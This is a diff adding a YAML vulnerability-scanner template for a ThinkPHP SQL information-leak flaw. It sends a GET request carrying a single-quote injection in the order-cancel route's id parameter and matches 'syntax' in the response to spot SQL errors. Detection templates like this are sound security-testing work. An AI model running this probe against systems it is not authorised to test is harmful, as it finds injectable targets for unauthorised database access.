@@ -1,0 +1,22 @@
+id: thinkphp_multi_sql_leak_8
+
+info:
+  name: "ThinkPHP 多实例 SQL 信息泄露漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+      
+      ThinkPHP framework instances are vulnerable to SQL information exposure due to improper validation of database query parameters. This allows remote attackers to infer sensitive database schema and content through error message analysis and crafted request patterns. The vulnerability persists across multiple framework instances, enabling lateral data extraction without authentication requirements.
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/order/cancel/id/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
